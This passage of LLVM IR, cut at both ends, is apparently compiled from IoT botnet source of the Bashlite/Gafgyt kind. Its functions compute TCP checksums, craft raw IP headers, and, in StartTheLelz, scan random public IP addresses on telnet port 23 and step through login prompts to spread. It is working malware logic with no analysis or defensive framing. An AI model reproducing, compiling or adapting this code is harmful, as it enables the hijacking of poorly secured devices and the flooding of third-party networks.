  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %45

; <label>:14:                                     ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #2
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #2
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %14
  store i32 0, i32* %3, align 4
  br label %45

; <label>:37:                                     ; preds = %14
  %38 = load i32, i32* %9, align 4
  %39 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %40 = call i32 @connect(i32 %38, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %37
  store i32 0, i32* %3, align 4
  br label %45

; <label>:43:                                     ; preds = %37
  %44 = load i32, i32* %9, align 4
  store i32 %44, i32* %3, align 4
  br label %45

; <label>:45:                                     ; preds = %43, %42, %36, %13
  %46 = load i32, i32* %3, align 4
  ret i32 %46
}

declare %struct.hostent* @gethostbyname(i8*) #3

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [128 x i8], align 16
  %10 = alloca i8, align 1
  %11 = alloca i32, align 4
  %12 = alloca %struct.__sigset_t, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %23 = load i32, i32* %4, align 4
  store i32 %23, i32* %11, align 4
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %25 = call i32 @rand_cmwc()
  %26 = xor i32 %24, %25
  call void @srand(i32 %26) #2
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = call zeroext i16 @htons(i16 zeroext 23) #13
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %31 = getelementptr inbounds [8 x i8], [8 x i8]* %30, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %31, i8 0, i64 8, i32 4, i1 false)
  %32 = call noalias i8* @malloc(i64 1025) #2
  store i8* %32, i8** %17, align 8
  %33 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 1025, i32 1, i1 false)
  %34 = load i32, i32* %11, align 4
  %35 = zext i32 %34 to i64
  %36 = call i8* @llvm.stacksave()
  store i8* %36, i8** %19, align 8
  %37 = alloca %struct.telstate_t, i64 %35, align 16
  %38 = bitcast %struct.telstate_t* %37 to i8*
  %39 = load i32, i32* %11, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 5
  call void @llvm.memset.p0i8.i64(i8* %38, i8 0, i64 %41, i32 16, i1 false)
  store i32 0, i32* %5, align 4
  br label %42

; <label>:42:                                     ; preds = %60, %2
  %43 = load i32, i32* %5, align 4
  %44 = load i32, i32* %11, align 4
  %45 = icmp slt i32 %43, %44
  br i1 %45, label %46, label %63

; <label>:46:                                     ; preds = %42
  %47 = load i32, i32* %5, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %48
  %50 = bitcast %struct.telstate_t* %49 to i8*
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 32, i32 16, i1 false)
  %51 = load i32, i32* %5, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %52
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %53, i32 0, i32 3
  store i8 1, i8* %54, align 1
  %55 = load i8*, i8** %17, align 8
  %56 = load i32, i32* %5, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %57
  %59 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %58, i32 0, i32 9
  store i8* %55, i8** %59, align 8
  br label %60

; <label>:60:                                     ; preds = %46
  %61 = load i32, i32* %5, align 4
  %62 = add nsw i32 %61, 1
  store i32 %62, i32* %5, align 4
  br label %42

; <label>:63:                                     ; preds = %42
  store i32 0, i32* %7, align 4
  br label %64

; <label>:64:                                     ; preds = %71, %63
  %65 = load i32, i32* %7, align 4
  %66 = add nsw i32 %65, 1
  store i32 %66, i32* %7, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds [11 x i8*], [11 x i8*]* @tmpdirs, i64 0, i64 %67
  %69 = load i8*, i8** %68, align 8
  %70 = icmp ne i8* %69, null
  br i1 %70, label %71, label %72

; <label>:71:                                     ; preds = %64
  br label %64

; <label>:72:                                     ; preds = %64
  br label %73

; <label>:73:                                     ; preds = %676, %72
  br label %74

; <label>:74:                                     ; preds = %73
  store i32 0, i32* %5, align 4
  br label %75

; <label>:75:                                     ; preds = %673, %74
  %76 = load i32, i32* %5, align 4
  %77 = load i32, i32* %11, align 4
  %78 = icmp slt i32 %76, %77
  br i1 %78, label %79, label %676

; <label>:79:                                     ; preds = %75
  %80 = load i32, i32* %5, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %81
  %83 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %82, i32 0, i32 7
  %84 = load i32, i32* %83, align 16
  %85 = icmp eq i32 %84, 0
  br i1 %85, label %86, label %92

; <label>:86:                                     ; preds = %79
  %87 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %88 = load i32, i32* %5, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %89
  %91 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %90, i32 0, i32 7
  store i32 %87, i32* %91, align 16
  br label %92

; <label>:92:                                     ; preds = %86, %79
  %93 = load i32, i32* %5, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %94
  %96 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %95, i32 0, i32 2
  %97 = load i8, i8* %96, align 8
  %98 = zext i8 %97 to i32
  switch i32 %98, label %672 [
    i32 0, label %99
    i32 1, label %235
    i32 2, label %333
    i32 3, label %378
    i32 4, label %423
    i32 5, label %468
    i32 6, label %513
    i32 7, label %611
  ]

; <label>:99:                                     ; preds = %92
  %100 = load i32, i32* %5, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %101
  %103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %102, i32 0, i32 3
  %104 = load i8, i8* %103, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp eq i32 %105, 1
  br i1 %106, label %107, label %127

; <label>:107:                                    ; preds = %99
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %109
  %111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %110, i32 0, i32 9
  %112 = load i8*, i8** %111, align 8
  store i8* %112, i8** %20, align 8
  %113 = load i32, i32* %5, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %114
  %116 = bitcast %struct.telstate_t* %115 to i8*
  call void @llvm.memset.p0i8.i64(i8* %116, i8 0, i64 32, i32 16, i1 false)
  %117 = load i8*, i8** %20, align 8
  %118 = load i32, i32* %5, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %119
  %121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %120, i32 0, i32 9
  store i8* %117, i8** %121, align 8
  %122 = call i32 @GetRandomPublicIP()
  %123 = load i32, i32* %5, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %124
  %126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %125, i32 0, i32 1
  store i32 %122, i32* %126, align 4
  br label %175

; <label>:127:                                    ; preds = %99
  %128 = load i32, i32* %5, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %129
  %131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %130, i32 0, i32 3
  %132 = load i8, i8* %131, align 1
  %133 = zext i8 %132 to i32
  %134 = icmp eq i32 %133, 0
  br i1 %134, label %135, label %174

; <label>:135:                                    ; preds = %127
  %136 = load i32, i32* %5, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %137
  %139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %138, i32 0, i32 5
  %140 = load i8, i8* %139, align 1
  %141 = add i8 %140, 1
  store i8 %141, i8* %139, align 1
  %142 = load i32, i32* %5, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %143
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %144, i32 0, i32 4
  %146 = load i8, i8* %145, align 2
  %147 = add i8 %146, 1
  store i8 %147, i8* %145, align 2
  %148 = load i32, i32* %5, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %149
  %151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %150, i32 0, i32 5
  %152 = load i8, i8* %151, align 1
  %153 = zext i8 %152 to i64
  %154 = icmp eq i64 %153, 9
  br i1 %154, label %155, label %160

; <label>:155:                                    ; preds = %135
  %156 = load i32, i32* %5, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %157
  %159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %158, i32 0, i32 3
  store i8 1, i8* %159, align 1
  br label %673

; <label>:160:                                    ; preds = %135
  %161 = load i32, i32* %5, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %162
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %163, i32 0, i32 4
  %165 = load i8, i8* %164, align 2
  %166 = zext i8 %165 to i64
  %167 = icmp eq i64 %166, 9
  br i1 %167, label %168, label %173

; <label>:168:                                    ; preds = %160
  %169 = load i32, i32* %5, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %170
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %171, i32 0, i32 3
  store i8 1, i8* %172, align 1
  br label %673

; <label>:173:                                    ; preds = %160
  br label %174

; <label>:174:                                    ; preds = %173, %127
  br label %175

; <label>:175:                                    ; preds = %174, %107
  %176 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %176, align 4
  %177 = call zeroext i16 @htons(i16 zeroext 23) #13
  %178 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %177, i16* %178, align 2
  %179 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %180 = getelementptr inbounds [8 x i8], [8 x i8]* %179, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %180, i8 0, i64 8, i32 4, i1 false)
  %181 = load i32, i32* %5, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %182
  %184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %183, i32 0, i32 1
  %185 = load i32, i32* %184, align 4
  %186 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %187 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %186, i32 0, i32 0
  store i32 %185, i32* %187, align 4
  %188 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %189 = load i32, i32* %5, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %190
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %191, i32 0, i32 0
  store i32 %188, i32* %192, align 16
  %193 = load i32, i32* %5, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %194
  %196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %195, i32 0, i32 0
  %197 = load i32, i32* %196, align 16
  %198 = icmp eq i32 %197, -1
  br i1 %198, label %199, label %200

; <label>:199:                                    ; preds = %175
  br label %673

; <label>:200:                                    ; preds = %175
  %201 = load i32, i32* %5, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %202
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %203, i32 0, i32 0
  %205 = load i32, i32* %204, align 16
  %206 = load i32, i32* %5, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %207
  %209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %208, i32 0, i32 0
  %210 = load i32, i32* %209, align 16
  %211 = call i32 (i32, i32, ...) @fcntl(i32 %210, i32 3, i8* null)
  %212 = or i32 %211, 2048
  %213 = call i32 (i32, i32, ...) @fcntl(i32 %205, i32 4, i32 %212)
  %214 = load i32, i32* %5, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %215
  %217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 16
  %219 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %220 = call i32 @connect(i32 %218, %struct.sockaddr* %219, i32 16)
  %221 = icmp eq i32 %220, -1
  br i1 %221, label %222, label %230

; <label>:222:                                    ; preds = %200
  %223 = call i32* @__errno_location() #13
  %224 = load i32, i32* %223, align 4
  %225 = icmp ne i32 %224, 115
  br i1 %225, label %226, label %230

; <label>:226:                                    ; preds = %222
  %227 = load i32, i32* %5, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %228
  call void @reset_telstate(%struct.telstate_t* %229)
  br label %234

; <label>:230:                                    ; preds = %222, %200
  %231 = load i32, i32* %5, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %232
  call void @advance_state(%struct.telstate_t* %233, i32 1)
  br label %234

; <label>:234:                                    ; preds = %230, %226
  br label %672

; <label>:235:                                    ; preds = %92
  br label %236

; <label>:236:                                    ; preds = %235
  %237 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %238 = getelementptr inbounds [16 x i64], [16 x i64]* %237, i64 0, i64 0
  %239 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %238) #2, !srcloc !6
  %240 = extractvalue { i64, i64* } %239, 0
  %241 = extractvalue { i64, i64* } %239, 1
  %242 = trunc i64 %240 to i32
  store i32 %242, i32* %21, align 4
  %243 = ptrtoint i64* %241 to i64
  %244 = trunc i64 %243 to i32
  store i32 %244, i32* %22, align 4
  br label %245

; <label>:245:                                    ; preds = %236
  br label %246

; <label>:246:                                    ; preds = %245
  %247 = load i32, i32* %5, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %248
  %250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %249, i32 0, i32 0
  %251 = load i32, i32* %250, align 16
  %252 = srem i32 %251, 64
  %253 = zext i32 %252 to i64
  %254 = shl i64 1, %253
  %255 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %256 = load i32, i32* %5, align 4
  %257 = sext i32 %256 to i64
  %258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %257
  %259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %258, i32 0, i32 0
  %260 = load i32, i32* %259, align 16
  %261 = sdiv i32 %260, 64
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds [16 x i64], [16 x i64]* %255, i64 0, i64 %262
  %264 = load i64, i64* %263, align 8
  %265 = or i64 %264, %254
  store i64 %265, i64* %263, align 8
  %266 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %266, align 8
  %267 = load i32, i32* %3, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %268, i64* %269, align 8
  %270 = load i32, i32* %5, align 4
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %271
  %273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %272, i32 0, i32 0
  %274 = load i32, i32* %273, align 16
  %275 = add nsw i32 %274, 1
  %276 = call i32 @select(i32 %275, %struct.__sigset_t* null, %struct.__sigset_t* %12, %struct.__sigset_t* null, %struct.timeval* %13)
  store i32 %276, i32* %6, align 4
  %277 = load i32, i32* %6, align 4
  %278 = icmp eq i32 %277, 1
  br i1 %278, label %279, label %311

; <label>:279:                                    ; preds = %246
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %280 = load i32, i32* %5, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %281
  %283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %282, i32 0, i32 0
  %284 = load i32, i32* %283, align 16
  %285 = bitcast i32* %15 to i8*
  %286 = call i32 @getsockopt(i32 %284, i32 1, i32 4, i8* %285, i32* %14) #2
  %287 = load i32, i32* %15, align 4
  %288 = icmp ne i32 %287, 0
  br i1 %288, label %289, label %293

; <label>:289:                                    ; preds = %279
  %290 = load i32, i32* %5, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %291
  call void @reset_telstate(%struct.telstate_t* %292)
  br label %310

; <label>:293:                                    ; preds = %279
  %294 = load i32, i32* %5, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %295
  %297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %296, i32 0, i32 0
  %298 = load i32, i32* %297, align 16
  %299 = load i32, i32* %5, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %300
  %302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %301, i32 0, i32 0
  %303 = load i32, i32* %302, align 16
  %304 = call i32 (i32, i32, ...) @fcntl(i32 %303, i32 3, i8* null)
  %305 = and i32 %304, -2049
  %306 = call i32 (i32, i32, ...) @fcntl(i32 %298, i32 4, i32 %305)
  %307 = load i32, i32* %5, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %308
  call void @advance_state(%struct.telstate_t* %309, i32 2)
  br label %310

; <label>:310:                                    ; preds = %293, %289
  br label %673

; <label>:311:                                    ; preds = %246
  %312 = load i32, i32* %6, align 4
  %313 = icmp eq i32 %312, -1
  br i1 %313, label %314, label %318

; <label>:314:                                    ; preds = %311
  %315 = load i32, i32* %5, align 4
  %316 = sext i32 %315 to i64
  %317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %316
  call void @reset_telstate(%struct.telstate_t* %317)
  br label %673

; <label>:318:                                    ; preds = %311
  br label %319

; <label>:319:                                    ; preds = %318
  %320 = load i32, i32* %5, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %321
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %322, i32 0, i32 7
  %324 = load i32, i32* %323, align 16
  %325 = add i32 %324, 5
  %326 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %327 = icmp ult i32 %325, %326
  br i1 %327, label %328, label %332

; <label>:328:                                    ; preds = %319
  %329 = load i32, i32* %5, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %330
  call void @reset_telstate(%struct.telstate_t* %331)
  br label %332

; <label>:332:                                    ; preds = %328, %319
  br label %672

; <label>:333:                                    ; preds = %92
  %334 = load i32, i32* %5, align 4
  %335 = sext i32 %334 to i64
  %336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %335
  %337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %336, i32 0, i32 0
  %338 = load i32, i32* %337, align 16
  %339 = load i32, i32* %3, align 4
  %340 = load i32, i32* %5, align 4
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %341
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %342, i32 0, i32 9
  %344 = load i8*, i8** %343, align 8
  %345 = call i32 @read_until_response(i32 %338, i32 %339, i8* %344, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %346 = icmp ne i32 %345, 0
  br i1 %346, label %347, label %364

; <label>:347:                                    ; preds = %333
  %348 = load i32, i32* %5, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %349
